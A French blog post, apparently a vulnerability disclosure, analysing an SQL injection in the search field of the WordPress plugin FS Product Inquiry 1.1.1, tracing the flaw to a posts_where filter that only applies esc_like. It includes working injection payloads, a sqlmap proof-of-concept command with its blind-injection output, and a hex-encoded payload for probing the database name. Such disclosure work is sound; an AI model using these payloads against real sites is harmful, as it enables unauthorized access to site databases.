---
title: "Faille d'injection SQL dans le plugin Wordpress FS Product Inquiry"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [FS Product Inquiry](https://wordpress.org/plugins/fs-product-inquiry/) se présente de cette façon :

> FS Product Inquiry is a WordPress product inquiry plugin. This plugin is useful for product inquiry and also store all the data in the database with email so we can use these emails as subscribe or for other product marketing purposes.

La version testée est la 1.1.1 et date d'il y a 3 ans au moment de ces lignes.

## La vulnérabilité

Le script `fs-product-inquiry.php` du plugin déclenche différentes actions pour activer le plugin.

Tout d'abord, il y a la création d'un nouveau post qui contient le texte `[fspi-show-products-list]` (on verra plus tard pourquoi) : 

```php
if(!function_exists('fspi_plugin_activated')){                                                                         
    function fspi_plugin_activated(){                                                                                  
        $field = array(                                                                                                
            array(                                                                                                     
                'id'                    => 1,                                                                          
                '_fs_field_title'       => 'Name',                                                                     
                '_fs_field_type'        => 'text',                                                                     
                '_fs_field_placeholder' => 'Enter Your Name',                                                          
                '_fs_field_position'    => 1,                                                                          
                '_fs_field_is_required' => true                                                                        
            ),                                                                                                         
            array(                                                                                                     
                'id'                    => 2,                                                                          
                '_fs_field_title'       => 'Email',                                                                    
                '_fs_field_type'        => 'email',                                                                    
                '_fs_field_placeholder' => 'Enter Your Email',                                                         
                '_fs_field_position'    => 2,                                                                          
                '_fs_field_is_required' => true                                                                        
            )                                                                                                          
        );                                                                                                             
        $inquiry_form_fields = $field;                                                                                 
        update_option('_fspi_inquiry_form_fields',$inquiry_form_fields);                                               
        update_option( '_fspi_server_url', 'https://www.fudugo.com/' );                                                
                                                                                                                       
        if (!get_page_by_title('FSPI Product Inquiry')) {                                                              
            $PageGuid = site_url() . "/fspi-product-inquiry";                                                          
            $fspi_inquiry_page  = array(                                                                               
                    'post_title'     => esc_html__( 'FSPI Product Inquiry', 'fspi' ),                                  
                    'post_type'      => 'page',                                                                        
                    'post_name'      => 'fspi-product-inquiry',                                                        
                    'post_content'   => '[fspi-show-products-list]',                                                   
                    'post_status'    => 'publish',
                    'comment_status' => 'closed',                                                                      
                    'ping_status'    => 'closed',                                                                      
                    'post_author'    => 1,                                                                             
                    'menu_order'     => 0,                                                                             
                    'guid'           => $PageGuid                                                                      
                );                                                                                                     
            $PageID = wp_insert_post( $fspi_inquiry_page, FALSE );                                                     
        }                                                                                                              
    }                                                                                                                  
}                                                                                                                      
```

À la fin du même script une instance de la classe `FSProductInquiry` est créée :

```php
/**                                                                                                                    
 * Returns the main instance of FSPI.                                                                                  
 * @return FSProductInquiry                                                                                            
 */                                                                                                                    
function FSPI() {                                                                                                      
    return FSProductInquiry::instance();                                                                               
}                                                                                                                      
                                                                                                                       
// Global for backwards compatibility.                                                                                 
$GLOBALS['FSProductInquiry'] = FSPI();
```

Cette classe définie dans `includes/class-fs-products.php` dispose d'un constructeur qui déclare différentes actions et filtres mais aussi un shortcode :

```php
class FSPIProduct extends FSPIProductSetting{                                                                          
    /**                                                                                                                
     * FSPIProduct Constructor.                                                                                        
     */                                                                                                                
    function __construct() {                                                                                           
        add_action( 'init', array($this,'fspi_products'));                                                             
        if(!shortcode_exists( 'fspi-show-products-list' ) ) {                                                          
            add_shortcode( 'fspi-show-products-list', array($this,'fspi_show_products_list') );                        
        }                                                                                                              
        add_action( 'add_meta_boxes', array($this,'fspi_product_meta_fields'));                                        
        add_action( 'save_post', array($this,'fspi_save_product_meta_data'));                                          
        add_filter( 'template_include', array($this,'fspi_show_product_detail'), 1 );                                  
        add_filter('taxonomy_template', array($this,'fspi_taxonomy_template'));                                        
        add_action('init',array($this,'fspi_register_session'));                                                       
                                                                                                                       
        add_action( 'comment_form_logged_in_after', array($this,'fspi_comment_rating_rating_field') );                 
        add_action( 'comment_form_after_fields', array($this,'fspi_comment_rating_rating_field') );                    
        add_action( 'wp_enqueue_scripts', array($this,'fspi_comment_rating_styles') );                                 
        add_action( 'comment_post', array($this,'fspi_comment_rating_save_comment_rating') );                          
        add_filter( 'comment_text', array($this,'fspi_comment_rating_display_rating'));                                
        add_action( 'wp_ajax_nopriv_fspi_get_inquiry_attribute', array($this,'fspi_get_inquiry_attribute' ));          
        add_action( 'wp_ajax_fspi_get_inquiry_attribute', array($this,'fspi_get_inquiry_attribute') );                 
        add_action( 'wp_ajax_nopriv_fspi_ck_loopul', array($this,'fspi_ck_loopul' ));                                  
        add_action( 'wp_ajax_fspi_ck_loopul', array($this,'fspi_ck_loopul') );                                         
    }
```

Un shortcode est, comme expliqué [dans la documentation Wordpress](https://developer.wordpress.org/reference/functions/add_shortcode/), un mot clé dont la présence dans un post va déclencher l'exécution d'une fonction callback.

Par conséquent, le post créé initialement par le plugin va utiliser la fonction de callback `fspi_show_products_list`.

Cette fonction en appelle une autre, à différents emplacements :

```php
--- snip ---
if (empty($_POST['_fs_product_id'])) {                                                                       
    $this->fs_get_all_products();                                                                          
} else {
--- snip ---
```

On se rapproche de notre vulnérabilité... 

```php
/*                                                                                                                 
* Define function to show product list                                                                             
*/                                                                                                                 
function fs_get_all_products() {                                                                                    
    wp_enqueue_script('jquery');

    add_filter( 'posts_where', array($this,'fspi_post_title_filter'), 10, 2 );
    $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
    $product_name = !empty($_POST['product_name'])?trim(sanitize_text_field($_POST['product_name'])):'';
    $args = array( 'post_type' => 'fspi-products', 'posts_per_page' => 9, 'paged' => $paged, 'fs_search_post_title' => $product_name);
    $loop = new WP_Query($args);
    /*
    * Remove filter to update wp_query for product search
    */
    remove_filter( 'posts_where', array($this,'fspi_post_title_filter'), 10 );
    include FSPI_BASE_DIR.'/templates/public/fspi-show-product-list.php';
}
```

Cette fonction hooke [posts_where](https://developer.wordpress.org/reference/hooks/posts_where/) afin d'agir sur la clause `WHERE` de la requête SQL qui retourne les posts :

> This filter applies to the posts where clause and allows you to restrict which posts will show up in various areas of the site.

Cette dernière fonction est la suivante :

```php
/*
* Update wp_query for product search
*/
function fspi_post_title_filter($where, $wp_query) {
    if ( $search_term = $wp_query->get( 'fs_search_post_title' ) ) {
        global $wpdb;
        $where .= ' AND ' . $wpdb->posts . '.post_title LIKE \'%' . $wpdb->esc_like( $search_term ) . '%\'';
    }
    return $where;
}
```

On voit ici que la seule fonction appelée sur la variable `$search_term` est [esc_like](https://developer.wordpress.org/reference/classes/wpdb/esc_like/) dont la définition est la suivante :

> First half of escaping for LIKE special characters % and _ before preparing for SQL.

Bref cette fonction ne protège aucunement des injections SQL.

Quand on se rend sur la page ajoutée par le plugin, on voit un champ de texte nommé `product_name` :

```html
<form class="form-inline" method="POST" action="" id="productSearchForm">
    <input type="text" name="product_name" class="form-control" id="inputSearch" placeholder="Search by Product Name">
    <button type="submit" class="btn btn-default mb-2 set-color" style="margin-right: 5px;color: #fff;">Search</button>
    <button type="button" onclick="javascript:resetSearchProduct()" class="btn btn-default mb-2" style="color: #fff;">Reset</button>
</form>
```

Si on active le debug du Wordpress dans `wp-config.php` :

```php
define( 'WP_DEBUG', true);
```

Et qu'on saisit une apostrophe dans le champ de texte, alors on peut voir l'erreur suivante :

```html
WordPress database error: [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' ORDER BY wp_posts.post_date DESC LIMIT 0, 9' at line 3]

SELECT SQL_CALC_FOUND_ROWS wp_posts.ID
FROM wp_posts WHERE 1=1 AND ((wp_posts.post_type = 'fspi-products' AND (wp_posts.post_status = 'publish')))
AND wp_posts.post_title LIKE '%\\'%'
ORDER BY wp_posts.post_date DESC LIMIT 0, 9
```
L'avant-dernière ligne de la requête (`AND wp_posts.post_title ...`) correspond à ce qui est injecté par le plugin.

On voit que notre caractère apostrophe n'a pas été échappé ce qui rend la requête invalide.

Si on saisit `' OR 1 #` alors la page nous retourne l'ensemble des pages (posts et autres) du Wordpress.

`sqlmap` retrouve sans difficultés la vulnérabilité même si le mode debug de Wordpress est désactivé.

PoC :

```bash
python sqlmap.py -u "http://localhost:8000/?page_id=5" --data "product_name=a" --risk 3 --level 5 -p product_name
```

Dans mon cas :

```
sqlmap identified the following injection point(s) with a total of 576 HTTP(s) requests:
---
Parameter: product_name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: product_name=-5801' OR 2811=2811-- PdlV

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: product_name=a' AND (SELECT 4949 FROM (SELECT(SLEEP(5)))oFWk)-- klxu
---
```

Lors de mes tests, j'ai dû faire face à un comportement inattendu de `sqlmap` qui identifiait correctement le SGBD à la première exécution, mais indiquait ensuite qu'il ne s'agissait plus du même...

Je pense que c'est lié au deux antislashs qui sont ajoutés devant chaque apostrophe, ce qui rend l'exploitation plus compliquée.

En conclusion l'écriture d'un exploit plus spécifique peut être nécessaire pour exploiter la vulnérabilité. On évitera d'utiliser plus d'un apostrophe en encodant les chaines en hexadécimal.

Par exemple pour vérifier que la base courante s'appelle `wordpress` :

```
' OR database()=0x776f72647072657373 #
```
